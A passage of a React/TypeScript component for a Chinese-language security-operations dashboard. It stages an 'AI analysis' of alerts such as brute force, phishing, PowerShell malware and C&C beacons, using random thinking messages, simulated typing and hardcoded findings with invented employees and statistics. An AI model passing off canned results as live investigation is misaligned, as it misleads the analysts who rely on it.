import { useState, useEffect, useRef, useMemo } from "react";
import { X, Brain, Download, Loader2, CheckCircle2, Zap } from "lucide-react";
import type { AlertItem } from "@/types";

interface AiAnalysisModalProps {
  alert: AlertItem | null;
  onClose: () => void;
}

interface StreamItem {
  section: string;
  label: string;
  detail?: string;
  tag?: string;
  tagColor?: string;
  tagBg?: string;
  highlight?: 'red' | 'blue';
  type?: 'terminal' | 'table' | 'table-row' | 'block';
  tableData?: { key: string; value: string }[];
}

const thinkingMessages = [
  "正在解析事件原始数据...",
  "正在关联资产与人员信息...",
  "正在分析登录行为特征...",
  "正在比对历史告警记录...",
  "正在检索威胁情报数据库...",
  "正在评估密码策略强度...",
  "正在构建攻击行为画像...",
  "正在生成综合研判结论...",
];

function useStreamSequencer(total: number) {
  const [currentIndex, setCurrentIndex] = useState(-1);
  const [thinkingText, setThinkingText] = useState("");
  const [typingItem, setTypingItem] = useState(-1);
  const [done, setDone] = useState(false);

  useEffect(() => {
    if (total === 0) return;
    setCurrentIndex(-1);
    setTypingItem(-1);
    setDone(false);
    setThinkingText("");

    const startTimeout = setTimeout(() => {
      beginItem(0);
    }, 800);

    return () => clearTimeout(startTimeout);
  }, [total]);

  function beginItem(idx: number) {
    if (idx >= total) {
      setDone(true);
      setTypingItem(-1);
      setThinkingText("");
      return;
    }
    setCurrentIndex(idx);
    setTypingItem(idx);
    setThinkingText(thinkingMessages[Math.floor(Math.random() * thinkingMessages.length)]);
  }

  function onTypingDone(idx: number) {
    setTypingItem(-1);
    const next = idx + 1;
    const pause = 400 + Math.floor(Math.random() * 600);
    setTimeout(() => beginItem(next), pause);
  }

  return { currentIndex, thinkingText, typingItem, onTypingDone, done };
}

function TypedDetail({ text, active, onComplete }: { text: string; active: boolean; onComplete?: () => void }) {
  const [displayed, setDisplayed] = useState("");
  const doneFlag = useRef(false);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (!active) {
      return;
    }

    if (doneFlag.current && displayed === text) {
      return;
    }

    hasStarted.current = true;
    doneFlag.current = false;
    let idx = 0;
    const speed = 15 + Math.floor(Math.random() * 20);

    const interval = setInterval(() => {
      if (idx < text.length) {
        setDisplayed(text.slice(0, idx + 1));
        idx++;
      } else {
        setDisplayed(text);
        doneFlag.current = true;
        clearInterval(interval);
        onComplete?.();
      }
    }, speed);

    return () => clearInterval(interval);
  }, [text, active, onComplete]);

  return (
    <span>
      {displayed}
      {active && !doneFlag.current && (
        <span className="inline-block w-[2px] h-3.5 bg-[#00b4d8] ml-0.5 align-middle typing-cursor" />
      )}
    </span>
  );
}

function TableBlock({
  title,
  rows,
  isActive,
  onDone,
}: {
  title: string;
  rows: { key: string; value: string }[];
  isActive: boolean;
  onDone: () => void;
}) {
  const [visibleRows, setVisibleRows] = useState(0);
  const doneRef = useRef(false);

  useEffect(() => {
    if (!isActive || doneRef.current) return;

    if (visibleRows >= rows.length) {
      doneRef.current = true;
      onDone();
      return;
    }

    const timer = setTimeout(() => {
      setVisibleRows((v) => v + 1);
    }, 300 + Math.random() * 200);

    return () => clearTimeout(timer);
  }, [isActive, visibleRows, rows.length, onDone]);

  return (
    <div className="animate-stream-in">
      <div className="bg-white rounded-lg border border-[#e2e8f0] overflow-hidden mb-3">
        <div className="px-4 py-2.5 bg-[#f8fafc] border-b border-[#e2e8f0]">
          <h4 className="text-xs font-bold text-[#334155]">{title}</h4>
        </div>
        <div className="divide-y divide-[#f1f5f9]">
          {rows.slice(0, visibleRows).map((row, i) => (
            <div key={i} className="flex px-4 py-2">
              <span className="text-[11px] text-[#94a3b8] w-[120px] shrink-0">{row.key}</span>
              <span className="text-[11px] text-[#334155] flex-1">{row.value}</span>
            </div>
          ))}
        </div>
        {isActive && visibleRows < rows.length && (
          <div className="px-4 py-1.5 flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-[#00b4d8] animate-pulse" />
            <span className="text-[10px] text-[#94a3b8]">加载中...</span>
          </div>
        )}
      </div>
    </div>
  );
}

function InfoBlock({
  title,
  lines,
  highlight,
  isActive,
  onDone,
}: {
  title?: string;
  lines: string[];
  highlight?: 'red' | 'blue';
  isActive: boolean;
  onDone: () => void;
}) {
  const [visibleLines, setVisibleLines] = useState(0);
  const doneRef = useRef(false);

  useEffect(() => {
    if (!isActive || doneRef.current) return;

    if (visibleLines >= lines.length) {
      doneRef.current = true;
      onDone();
      return;
    }

    const timer = setTimeout(() => {
      setVisibleLines((v) => v + 1);
    }, 200 + Math.random() * 300);

    return () => clearTimeout(timer);
  }, [isActive, visibleLines, lines.length, onDone]);

  const bgClass = highlight === 'red'
    ? 'bg-[#fef2f2] border-[#fecaca]'
    : highlight === 'blue'
    ? 'bg-[#eff6ff] border-[#bfdbfe]'
    : 'bg-white border-[#e2e8f0]';

  const textClass = highlight === 'red'
    ? 'text-[#991b1b]'
    : highlight === 'blue'
    ? 'text-[#1d4ed8]'
    : 'text-[#475569]';

  return (
    <div className="animate-stream-in mb-3">
      <div className={`rounded-lg border ${bgClass} overflow-hidden`}>
        {title && (
          <div className="px-4 py-2 bg-[#f8fafc]/80 border-b border-[#e2e8f0]/60">
            <h4 className="text-xs font-bold text-[#334155]">{title}</h4>
          </div>
        )}
        <div className="p-3">
          {lines.slice(0, visibleLines).map((line, i) => (
            line === '' ? (
              <div key={i} className="h-3" />
            ) : (
              <p key={i} className={`text-[11px] ${textClass} leading-relaxed ${i > 0 && lines[i-1] !== '' ? 'mt-0.5' : ''}`}>
                {line}
              </p>
            )
          ))}
        </div>
        {isActive && visibleLines < lines.length && (
          <div className="px-3 pb-2 flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-[#00b4d8] animate-pulse" />
            <span className="text-[10px] text-[#94a3b8]">分析中...</span>
          </div>
        )}
      </div>
    </div>
  );
}

function StreamItemRow({
  item,
  isActive,
  onTypingDone,
}: {
  item: StreamItem;
  isActive: boolean;
  onTypingDone: () => void;
}) {
  if (item.type === 'table' && item.tableData) {
    return (
      <TableBlock
        title={item.label}
        rows={item.tableData}
        isActive={isActive}
        onDone={onTypingDone}
      />
    );
  }

  if (item.type === 'block') {
    const lines = item.detail.split('\n');
    return (
      <InfoBlock
        title={item.label || undefined}
        lines={lines}
        highlight={item.highlight}
        isActive={isActive}
        onDone={onTypingDone}
      />
    );
  }

  if (item.type === 'terminal') {
    return (
      <div className="animate-stream-in">
        <div className="my-2 bg-[#0f172a] rounded-lg border border-[#1e293b] overflow-hidden font-mono text-[11px] shadow-lg">
          <div className="flex items-center gap-1.5 px-3 py-2 bg-[#1e293b] border-b border-[#334155]">
            <span className="w-2.5 h-2.5 rounded-full bg-[#ef4444]" />
            <span className="w-2.5 h-2.5 rounded-full bg-[#f59e0b]" />
            <span className="w-2.5 h-2.5 rounded-full bg-[#22c55e]" />
            <span className="text-[#64748b] text-[10px] ml-2">tail -f /var/log/auth.log (SSH: log-collector.internal)</span>
          </div>
          <div className="p-3 text-[#a8b5c8] leading-relaxed whitespace-pre">
            <TypedDetail text={item.detail} active={isActive} onComplete={onTypingDone} />
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="animate-stream-in">
      {item.highlight === 'red' ? (
        <div className="p-2 bg-[#fef2f2] border border-[#fecaca] rounded">
          <p className="text-xs text-[#991b1b] leading-relaxed">
            {item.label && <span className="font-medium">{item.label}</span>}
            <TypedDetail text={item.detail} active={isActive} onComplete={onTypingDone} />
          </p>
        </div>
      ) : item.highlight === 'blue' ? (
        <div className="p-2 bg-[#eff6ff] border border-[#bfdbfe] rounded">
          <p className="text-xs text-[#1d4ed8] leading-relaxed">
            {item.label && <span className="font-medium">{item.label}</span>}
            <TypedDetail text={item.detail} active={isActive} onComplete={onTypingDone} />
          </p>
        </div>
      ) : (
        <div className="flex items-start gap-2.5 py-1.5 border-b border-[#e2e8f0]/60 last:border-0">
          <CheckCircle2 className="w-3.5 h-3.5 mt-0.5 text-[#52b788] shrink-0" />
          <div className="flex-1 min-w-0">
            <div className="flex items-baseline gap-2 flex-wrap">
              <span className="text-xs font-medium text-[#0f172a]">{item.label}</span>
              {item.tag && (
                <span
                  className="inline-flex items-center px-1.5 py-0.5 rounded text-[10px] font-mono font-medium"
                  style={{
                    color: item.tagColor || "#475569",
                    backgroundColor: item.tagBg || "#f1f5f9",
                  }}
                >
                  {item.tag}
                </span>
              )}
            </div>
            <p className="text-xs text-[#475569] mt-0.5 leading-relaxed min-h-[1.1em]">
              <TypedDetail text={item.detail} active={isActive} onComplete={onTypingDone} />
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

function StreamSection({
  label,
  items,
  currentIndex,
  startIdx,
  typingItem,
  onTypingDone,
  visible,
}: {
  label: string;
  items: StreamItem[];
  currentIndex: number;
  startIdx: number;
  typingItem: number;
  onTypingDone: (idx: number) => void;
  visible: boolean;
}) {
  if (!visible) return null;

  return (
    <div className="mx-4 bg-white rounded-lg border border-[#e2e8f0] overflow-hidden animate-fade-in-up">
      <div className="px-4 py-3 bg-[#f8fafc] border-b border-[#e2e8f0]">
        <h3 className="text-sm font-bold text-[#334155] flex items-center gap-2">
          <span className="w-1.5 h-4 rounded-full bg-[#3b82f6]" />
          {label}
        </h3>
      </div>
      <div className="p-4 space-y-2">
        {items.map((item, i) => {
          const globalIdx = startIdx + i;
          const isActive = typingItem === globalIdx;
          const hasAppeared = currentIndex >= globalIdx;

          if (!hasAppeared) return null;

          return (
            <StreamItemRow
              key={i}
              item={item}
              isActive={isActive}
              onTypingDone={() => onTypingDone(globalIdx)}
            />
          );
        })}
      </div>
    </div>
  );
}

function TerminalLogSection({
  lines,
  onDone,
  active,
}: {
  lines: string[];
  onDone: () => void;
  active: boolean;
}) {
  const [visibleLines, setVisibleLines] = useState(0);
  const doneRef = useRef(false);
  const startedRef = useRef(false);

  useEffect(() => {
    if (!active || doneRef.current) return;
    startedRef.current = true;

    if (visibleLines >= lines.length) {
      doneRef.current = true;
      onDone();
      return;
    }

    const timer = setTimeout(() => {
      setVisibleLines((v) => v + 1);
    }, 150 + Math.random() * 250);

    return () => clearTimeout(timer);
  }, [active, visibleLines, lines.length, onDone]);

  return (
    <div className="mx-4 animate-fade-in-up">
      <div className="bg-[#0a0e1a] rounded-lg border border-[#1e293b] overflow-hidden shadow-xl">
        <div className="flex items-center justify-between px-4 py-2.5 bg-[#1a1f2e] border-b border-[#2a3040]">
          <div className="flex items-center gap-2">
            <div className="flex gap-1.5">
              <span className="w-3 h-3 rounded-full bg-[#ef4444]" />
              <span className="w-3 h-3 rounded-full bg-[#f59e0b]" />
              <span className="w-3 h-3 rounded-full bg-[#22c55e]" />
            </div>
            <span className="text-[#64748b] text-[10px] ml-2 font-mono">investigator@security:~$</span>
          </div>
          <span className="text-[#475569] text-[10px] font-mono">ssh root@log-collector.internal</span>
        </div>
        <div className="p-4 font-mono text-[11px] leading-relaxed space-y-0.5 min-h-[120px] bg-[#0a0e1a]">
          {lines.slice(0, visibleLines).map((line, i) => {
            const isCmd = line.startsWith('$');
            const isSeparator = line === '---';
            return (
              <div key={i} className="flex">
                <span className="text-[#475569] w-[20px] shrink-0 select-none text-right pr-2">{i + 1}</span>
                {isSeparator ? (
                  <span className="text-[#334155] flex-1 border-t border-[#1e293b] my-1" />
                ) : isCmd ? (
                  <span className="text-[#22c55e] flex-1">
                    <span className="text-[#475569] mr-2">$</span>
                    {line.slice(1)}
                  </span>
                ) : (
                  <span className="text-[#94a3b8] flex-1">{line}</span>
                )}
              </div>
            );
          })}
          {active && visibleLines < lines.length && (
            <div className="flex items-center gap-2 pt-1">
              <span className="w-2 h-4 bg-[#22c55e] animate-pulse inline-block" />
              <span className="text-[#475569] text-[10px] font-mono">investigating...</span>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function formatTime(alert: AlertItem, offsetMinutes: number): string {
  const pad = (n: number) => String(n).padStart(2, '0');
  const parts = alert.time.split(/[: -]/);
  if (parts.length >= 4) {
    const month = parseInt(parts[0]);
    const day = parseInt(parts[1]);
    const hour = parseInt(parts[2]);
    const minute = parseInt(parts[3]) + offsetMinutes;
    const extraHour = Math.floor(minute / 60);
    return `2026-${pad(month)}-${pad(day)} ${pad(hour + extraHour)}:${pad(minute % 60)}:${parts[4] || '00'}`;
  }
  return `2026-${alert.time}`;
}

function generateAnalysisContent(alert: AlertItem) {
  const eventTime = `2026-${alert.time.slice(0, 2)}-${alert.time.slice(3)}`;
  const completeTime = formatTime(alert, 2);

  const section1: StreamItem[] = [
    { section: "basic", label: "事件时间", detail: eventTime },
    { section: "basic", label: "调查完成时间", detail: completeTime },
    { section: "basic", label: "事件标题", detail: alert.name },
    { section: "basic", label: "事件描述", detail: alert.detail },
  ];

  // 如果有结构化数据，使用新的展示方式
  if (alert.employeeProfile || alert.historicalBehavior || alert.accessSource || 
      alert.approvalProcess || alert.dataDetails || alert.terminalLogs) {
    return generateStructuredContent(alert, eventTime, completeTime);
  }

  // 否则使用旧的生成方式
  const section2 = generateDetailSections(alert, eventTime);
  const logLines = generateLogLines(alert);
  const section4 = generateConclusion(alert, eventTime);

  return { section1, section2, logLines, section3Placeholder: { section: "log", label: "", detail: "" } as StreamItem, section4 };
}

function generateStructuredContent(alert: AlertItem, eventTime: string, completeTime: string): {
  section1: StreamItem[];
  section2: StreamItem[];
  logLines: string[];
  section3Placeholder: StreamItem;
  section4: StreamItem[];
} {
  const section1: StreamItem[] = [
    { section: "basic", label: "事件时间", detail: eventTime },
    { section: "basic", label: "调查完成时间", detail: completeTime },
    { section: "basic", label: "事件标题", detail: alert.name },
    { section: "basic", label: "事件描述", detail: alert.eventDescription || alert.detail },
  ];

  const section2: StreamItem[] = [];

  // 员工档案
  if (alert.employeeProfile) {
    const ep = alert.employeeProfile;
    const tableData: { key: string; value: string }[] = [
      { key: "姓名", value: ep.name },
      { key: "邮箱", value: ep.email },
    ];
    if (ep.employeeId) tableData.push({ key: "工号", value: ep.employeeId });
    tableData.push(
      { key: "部门", value: ep.department },
      { key: "岗位", value: ep.position },
    );
    if (ep.tenure) tableData.push({ key: "入职时间", value: ep.tenure });
    if (ep.manager) tableData.push({ key: "直属上级", value: ep.manager });
    tableData.push({ key: "工作时间", value: ep.workHours });

    section2.push({
      section: "detail",
      label: "员工档案",
      type: 'table',
      tableData,
    });
  }

  // 历史行为
  if (alert.historicalBehavior) {
    const hb = alert.historicalBehavior;
    section2.push({
      section: "detail",
      label: "历史行为分析",
      type: 'table',
      tableData: [
        { key: "统计周期", value: hb.period },
        { key: "正常访问时间", value: hb.normalAccessTimes },
        { key: "异常登录次数", value: String(hb.abnormalLoginCount) },
        { key: "数据导出历史", value: hb.dataExportHistory },
        { key: "是否首次告警", value: hb.firstAlert ? "是" : "否" },
      ],
    });
  }

  // 访问来源
  if (alert.accessSource) {
    const as = alert.accessSource;
    section2.push({
      section: "detail",
      label: "访问来源",
      type: 'table',
      tableData: [
        { key: "IP 地址", value: as.ip },
        { key: "设备", value: as.device },
        { key: "是否 VPN", value: as.isVpn ? "是" : "否" },
        { key: "使用工具", value: as.tool },
      ],
    });
  }

  // 数据详情
  if (alert.dataDetails) {
    const dd = alert.dataDetails;
    section2.push({
      section: "detail",
      label: "数据详情",
      type: 'table',
      tableData: [
        { key: "记录数", value: String(dd.recordCount) },
        { key: "数据大小", value: dd.dataSize },
        { key: "敏感字段", value: dd.sensitiveFields.join(", ") },
      ],
    });
  }

  // 审批流程
  if (alert.approvalProcess) {
    const ap = alert.approvalProcess;
    const tableData: { key: string; value: string }[] = [
      { key: "提交时间", value: ap.submitTime },
    ];
    if (ap.approver) tableData.push({ key: "审批人", value: ap.approver });
    tableData.push(
      { key: "用途", value: ap.purpose },
      { key: "归档时间", value: ap.archiveTime },
      { key: "原因", value: ap.reason },
    );

    section2.push({
      section: "detail",
      label: "审批流程",
      type: 'table',
      tableData,
    });
  }

  // 终端日志
  const logLines: string[] = [];
  if (alert.terminalLogs && alert.terminalLogs.length > 0) {
    alert.terminalLogs.forEach((log, index) => {
      if (index > 0) logLines.push('---');
      logLines.push(`${log.timestamp} ${log.source} ${log.process}:`);
      logLines.push(log.message);
      logLines.push(log.raw);
    });
  } else {
    logLines.push("暂无终端日志数据");
  }

  // 综合结论
  const section4: StreamItem[] = [];
  
  if (alert.comprehensiveAssessment) {
    section4.push({
      section: "conclusion",
      label: "综合评估",
      type: 'block',
      highlight: 'red',
      detail: alert.comprehensiveAssessment,
    });
  }

  if (alert.handlingMeasures && alert.handlingMeasures.length > 0) {
    section4.push({
      section: "conclusion",
      label: "处置措施",
      type: 'table',
      tableData: alert.handlingMeasures.map((measure, index) => ({
        key: `${index + 1}.`,
        value: measure,
      })),
    });
  }

  return { section1, section2, logLines, section3Placeholder: { section: "log", label: "", detail: "" } as StreamItem, section4 };
}

function generateDetailSections(alert: AlertItem, eventTime: string): StreamItem[] {
  const src = alert.source;
  const ts = eventTime;
  const monthDay = alert.time.slice(0, 5);
  const levelLabel = alert.level === 'critical' ? '严重' : alert.level === 'warning' ? '警告' : '信息';
  const levelTagColor = alert.level === 'critical' ? '#dc2626' : alert.level === 'warning' ? '#d97706' : '#64748b';
  const levelTagBg = alert.level === 'critical' ? '#fef2f2' : alert.level === 'warning' ? '#fffbeb' : '#f1f5f9';

  const base: StreamItem[] = [
    { section: "detail", label: "事件发生时间", detail: ts },
    { section: "detail", label: "事件等级", detail: levelLabel, tag: levelLabel, tagColor: levelTagColor, tagBg: levelTagBg },
  ];

  if (alert.name.includes("暴力破解") || alert.name.includes("暴力破解攻击")) {
    return [...base,
      { section: "detail", label: "服务节点", detail: `mail-server (${src})` },
      { section: "detail", label: "触发安全策略", detail: "疑似暴力破解" },
      { section: "detail", label: "事件来源", detail: "态势感知平台" },
      {
        section: "detail", label: "异常行为判定", type: 'table', tableData: [
          { key: "试错频率", value: "0.18秒/次，远超人类操作极限（通常>2秒/次）" },
          { key: "攻击模式", value: "同一IP持续不间断密集组合，4秒内发起超过20次登录尝试，符合自动化字典攻击特征" },
        ],
      },
      {
        section: "detail", label: "1. 确认邮件账户所属员工", type: 'table', tableData: [
          { key: "邮箱账号", value: "itservice7@kiiik.com" },
          { key: "员工姓名", value: "许博" },
          { key: "所属部门", value: "基础运维部" },
        ],
      },
      {
        section: "detail", label: "2. 本次多次试错登录特征", type: 'table', tableData: [
          { key: "登录失败次数", value: "60次" },
          { key: "发生时间段", value: `${ts} - 09:15:41` },
          { key: "平均间隔", value: "0.18秒/次（最小0.05秒）" },
          { key: "登录特征", value: "连续>20次" },
        ],
      },
      {
        section: "detail", label: "3. 密码策略调查", type: 'table', tableData: [
          { key: "上次修改时间", value: "2026-03-20" },
          { key: "规定到期日", value: "2026-06-18（临近过期）" },
          { key: "风险提示", value: "符合12位+大小写+特殊字符，但密码临近过期" },
        ],
      },
      {
        section: "detail", label: "4. 近7天类似行为调查", type: 'table', tableData: [
          { key: "2026-05-09", value: "同一IP，失败38次，攻击时间22:10-22:40" },
          { key: "2026-05-11", value: "同一IP，失败45次，攻击时间22:30-23:00" },
          { key: "2026-05-13", value: "同一IP，失败52次，攻击时间22:00-22:50" },
          { key: `${monthDay}（今日）`, value: "同一IP，失败60次，攻击时间持续进行中" },
          { key: "累计趋势", value: "近7天同一IP累计试错195次，攻击频率逐日攀升（38→45→52→60次），时间规律一致，均集中在22:00后非工作时段" },
        ],
      },
      {
        section: "detail", label: "5. 试错发起IP归属地", type: 'table', tableData: [
          { key: "来源IP", value: src },
          { key: "IP归属地", value: "拉萨/香港" },
          { key: "威胁情报标记", value: "360标记为高风险IP节点" },
          { key: "历史告警记录", value: "过去90天内，出现在本企业告警记录2次" },
        ],
      },
      {
        section: "detail", label: "6. 关联调查——其他账号受影响情况", type: 'table', tableData: [
          { key: "调查结果", value: "未发现其他账号受到同一IP攻击" },
        ],
      },
      {
        section: "detail", label: "7. 账号近期异常行为", type: 'table', tableData: [
          { key: "登录成功记录", value: "全部失败" },
          { key: "最近一次正常登录", value: "2026-05-14 18:23:17" },
          { key: "外发行为", value: "未发现异常" },
          { key: "其他异常操作", value: "未发现" },
          { key: "结论", value: "账号未成功登录，暂未发现异常" },
        ],
      },
    ];
  }

  if (alert.name.includes("钓鱼邮件")) {
    return [...base,
      { section: "detail", label: "攻击来源", detail: src },
      { section: "detail", label: "触发安全策略", detail: "钓鱼邮件检测规则" },
      { section: "detail", label: "事件来源", detail: "邮件安全网关" },
      {
        section: "detail", label: "钓鱼邮件特征分析", type: 'table', tableData: [
          { key: "发件域名", value: src },
          { key: "仿冒对象", value: "内部OA系统登录页面" },
          { key: "邮件主题", value: "【紧急】您的OA账户存在异常，请立即验证" },
          { key: "链接域名", value: "login-oa.verify-portal.xyz" },
          { key: "SSL证书", value: "自签名证书，非受信任CA颁发" },
        ],
      },
      {
        section: "detail", label: "1. 邮件投递范围", type: 'table', tableData: [
          { key: "收件人总数", value: "12人" },
          { key: "涉及部门", value: "基础运维部、技术研发部" },
          { key: "邮件发送时间", value: "2026-05-10 13:40:12" },
        ],
      },
      {
        section: "detail", label: "2. 收件人点击情况", type: 'table', tableData: [
          { key: "已点击链接人数", value: "3人" },
          { key: "已提交凭证人数", value: "0人" },
          { key: "已标记为垃圾邮件", value: "4人" },
          { key: "尚未处理", value: "5人" },
        ],
      },
      {
        section: "detail", label: "3. 链接目标分析", type: 'table', tableData: [
          { key: "目标IP", value: "198.51.100.23" },
          { key: "IP归属地", value: "俄罗斯/莫斯科" },
          { key: "页面内容", value: "伪造OA登录页，劫持凭据" },
          { key: "恶意载荷", value: "页面嵌入窃密脚本收集输入" },
        ],
      },
      {
        section: "detail", label: "4. 受影响账户风险", type: 'table', tableData: [
          { key: "已识别点击用户", value: "张明远、李志强、王浩" },
          { key: "凭证是否泄露", value: "尚未确认提交" },
          { key: "建议操作", value: "即时重置密码、检查MFA状态" },
        ],
      },
      {
        section: "detail", label: "5. 历史类似邮件", type: 'table', tableData: [
          { key: "近30天同类邮件", value: "2封" },
          { key: "发件域名相似度", value: "高（均为仿冒kiiik.com）" },
          { key: "关联分析", value: "疑似同一团伙持续作恶" },
        ],
      },
    ];
  }

  if (alert.name.includes("大规模下载")) {
    const user = src.replace("User: ", "");
    return [...base,
      { section: "detail", label: "涉及用户", detail: user },
      { section: "detail", label: "触发安全策略", detail: "用户异常行为检测" },
      { section: "detail", label: "事件来源", detail: "DLP数据防泄漏系统" },
      {
        section: "detail", label: "异常行为判定", type: 'table', tableData: [
          { key: "下载时间", value: "22:30 - 23:15（非工作时间）" },
          { key: "下载总量", value: "45.6 GB" },
          { key: "涉及文件数", value: "1,283个" },
          { key: "文件类型", value: "数据库备份(.bak)、配置文件(.conf)" },
        ],
      },
      {
        section: "detail", label: "1. 用户行为基线对比", type: 'table', tableData: [
          { key: "历史日均下载量", value: "约 200 MB" },
          { key: "本次下载量", value: "45.6 GB（超出基线 228 倍）" },
          { key: "历史工作时间下载", value: "98% 集中在 09:00-18:00" },
          { key: "本次时间", value: "22:30 非工作时间" },
        ],
      },
      {
        section: "detail", label: "2. 下载内容分析", type: 'table', tableData: [
          { key: "主要文件", value: "数据库全量备份文件" },
          { key: "敏感等级", value: "高（含用户表、订单表）" },
          { key: "目标路径", value: "本地磁盘 D:\\backup\\" },
          { key: "是否压缩", value: "已打包为 .zip（疑似外传准备）" },
        ],
      },
      {
        section: "detail", label: "3. 审批记录", type: 'table', tableData: [
          { key: "是否有数据导出审批", value: "未发现" },
          { key: "是否涉及备份策略", value: "备份窗口为每周日凌晨 03:00" },
          { key: "结论", value: "不符合预定备份策略，审批缺失" },
        ],
      },
    ];
  }

  if (alert.name.includes("PowerShell") || alert.name.includes("脚本执行")) {
    const pc = src;
    return [...base,
      { section: "detail", label: "终端节点", detail: pc },
      { section: "detail", label: "触发安全策略", detail: "终端行为检测 / AMSI" },
      { section: "detail", label: "事件来源", detail: "EDR终端检测与响应平台" },
      {
        section: "detail", label: "异常行为判定", type: 'table', tableData: [
          { key: "执行策略", value: "绕过（Bypass）" },
          { key: "执行方式", value: "隐藏窗口无交互执行" },
          { key: "执行时间", value: "03:15 AM（非工作时间）" },
          { key: "父进程", value: "explorer.exe（可疑调用链）" },
        ],
      },
      {
        section: "detail", label: "1. 脚本内容分析", type: 'table', tableData: [
          { key: "脚本路径", value: "C:\\Users\\admin\\AppData\\Local\\Temp\\invoke-sys.ps1" },
          { key: "脚本长度", value: "3,472 字节" },
          { key: "关键函数", value: "Invoke-Expression, Start-Process" },
          { key: "混淆特征", value: "Base64编码 + 变量名混淆" },
        ],
      },
      {
        section: "detail", label: "2. 行为特征", type: 'table', tableData: [
          { key: "网络连接", value: "尝试连接 45.33.32.156:8443" },
          { key: "进程创建", value: "创建 rundll32.exe 子进程" },
          { key: "注册表修改", value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
          { key: "持久化机制", value: "写入启动项实现自启动" },
        ],
      },
      {
        section: "detail", label: "3. 影响评估", type: 'table', tableData: [
          { key: "终端状态", value: "已隔离" },
          { key: "数据外泄", value: "未发现" },
          { key: "横向移动", value: "未发现" },
        ],
      },
    ];
  }

  if (alert.name.includes("C&C") || alert.name.includes("心跳连接")) {
    return [...base,
      { section: "detail", label: "受影响终端", detail: src },
      { section: "detail", label: "触发安全策略", detail: "威胁情报域名匹配" },
      { section: "detail", label: "事件来源", detail: "流量分析平台" },
      {
        section: "detail", label: "异常连接判定", type: 'table', tableData: [
          { key: "目标域名", value: "c2-panel.oss-cache.xyz" },
          { key: "目标IP", value: "198.51.100.88" },
          { key: "连接协议", value: "HTTPS（自定义证书）" },
          { key: "通信频率", value: "每 60 秒心跳一次" },
        ],
      },
      {
        section: "detail", label: "1. 威胁情报匹配", type: 'table', tableData: [
          { key: "VirusTotal", value: "7/70 安全厂商标记为恶意" },
          { key: "DomainTools", value: "域名注册于2026-04-01，注册信息隐藏" },
          { key: "内部情报库", value: "匹配已知APT团伙C&C基础设施" },
        ],
      },
      {
        section: "detail", label: "2. 终端进程溯源", type: 'table', tableData: [
          { key: "发起进程", value: "svchost.exe（非系统路径）" },
          { key: "进程路径", value: "C:\\Windows\\System32\\syshelper\\svchost.exe" },
          { key: "MD5哈希", value: "a1b2c3d4e5f6..." },
          { key: "数字签名", value: "无有效签名" },
        ],
      },
      {
        section: "detail", label: "3. 影响范围评估", type: 'table', tableData: [
          { key: "感染时长", value: "约 72 小时（从首次心跳推算）" },
          { key: "已外发数据", value: "约 15 MB（需流量回溯确认）" },
          { key: "同网段受影响", value: "排查中" },
        ],
      },
    ];
  }

  if (alert.name.includes("VPN")) {
    return [...base,
      { section: "detail", label: "VPN网关", detail: "vpn.kiiik.com" },
      { section: "detail", label: "触发安全策略", detail: "地理围栏异常登录拦截" },
      { section: "detail", label: "事件来源", detail: "VPN认证网关" },
      {
        section: "detail", label: "异常登录判定", type: 'table', tableData: [
          { key: "来源IP", value: src },
          { key: "IP归属地", value: "俄罗斯" },
          { key: "尝试次数", value: "47次" },
          { key: "尝试时长", value: "30分钟" },
          { key: "拦截结果", value: "全部拦截，未成功登录" },
        ],
      },
      {
        section: "detail", label: "1. 试错账号分析", type: 'table', tableData: [
          { key: "被尝试账号", value: "admin, root, vpn_user, zhang.san, li.si" },
          { key: "有效账号", value: "zhang.san, li.si（已通知修改密码）" },
          { key: "默认账号", value: "admin, root（已禁用）" },
        ],
      },
      {
        section: "detail", label: "2. 时间分布", type: 'table', tableData: [
          { key: "攻击开始", value: "05:30 UTC（当地时间 08:30）" },
          { key: "攻击结束", value: "06:00 UTC" },
          { key: "攻击模式", value: "持续低频试错，规避频率限制" },
        ],
      },
      {
        section: "detail", label: "3. 关联分析", type: 'table', tableData: [
          { key: "同一IP历史记录", value: "近30天未出现" },
          { key: "同类攻击趋势", value: "本季度VPN暴力破解上升 40%" },
        ],
      },
    ];
  }

  if (alert.name.includes("同步异常") || alert.name.includes("邮箱日志")) {
    return [...base,
      { section: "detail", label: "服务组件", detail: src },
      { section: "detail", label: "触发安全策略", detail: "数据管道健康检查" },
      { section: "detail", label: "事件来源", detail: "日志聚合平台" },
      {
        section: "detail", label: "异常判定", type: 'table', tableData: [
          { key: "同步状态", value: "连接中断" },
          { key: "失败重试次数", value: "6次" },
          { key: "最后成功同步", value: "2026-05-10 09:15:00" },
          { key: "中断时间", value: "约 5 分钟" },
        ],
      },
      {
        section: "detail", label: "1. 连接诊断", type: 'table', tableData: [
          { key: "目标端点", value: "imap.kiiik.com:993" },
          { key: "连接测试", value: "超时（TCP 握手失败）" },
          { key: "DNS解析", value: "正常" },
          { key: "网络路由", value: "可达（ICMP正常）" },
        ],
      },
      {
        section: "detail", label: "2. 错误日志", type: 'table', tableData: [
          { key: "错误代码", value: "E1401 - Authentication Failed" },
          { key: "错误详情", value: "API Key 过期或凭据无效" },
          { key: "修复建议", value: "更新Connector API Key" },
        ],
      },
      {
        section: "detail", label: "3. 影响范围", type: 'table', tableData: [
          { key: "影响功能", value: "邮箱日志实时分析中断" },
          { key: "受影响的检测规则", value: "钓鱼邮件检测、暴力破解检测" },
          { key: "数据积压", value: "约 2,000 条未同步日志" },
        ],
      },
    ];
  }

  if (alert.name.includes("数据库") || alert.name.includes("敏感字段")) {
    const user = src.replace("User: ", "");
    return [...base,
      { section: "detail", label: "涉及账号", detail: user },
      { section: "detail", label: "触发安全策略", detail: "数据库审计规则 - 敏感数据访问异常" },
      { section: "detail", label: "事件来源", detail: "数据库审计平台" },
      {
        section: "detail", label: "异常查询判定", type: 'table', tableData: [
          { key: "数据库实例", value: "prod-mysql-01 (10.22.1.100:3306)" },
          { key: "目标表", value: "user_accounts, orders, payment_info" },
          { key: "查询类型", value: "全表扫描 (SELECT * 无WHERE条件)" },
          { key: "拉取记录数", value: "超过 10,000 条" },
        ],
      },
      {
